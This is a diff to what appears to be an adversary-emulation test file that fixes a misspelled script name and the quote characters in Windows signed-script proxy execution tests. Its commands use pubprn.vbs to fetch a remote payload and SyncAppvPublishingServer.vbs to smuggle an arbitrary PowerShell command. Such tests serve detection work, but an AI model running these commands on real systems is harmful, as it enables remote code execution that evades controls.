@@ -22,9 +22,9 @@ atomic_tests:
     command: |
       cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
 
-- name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+- name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
   description: |
-    Executes the signed SyncAppvPublishingServe script with options to execute an arbitrary PowerShell command.
+    Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
 
   supported_platforms:
     - windows
@@ -39,7 +39,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+      C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
 
 - name: manage-bde.wsf Signed Script Command Execution
   description: |
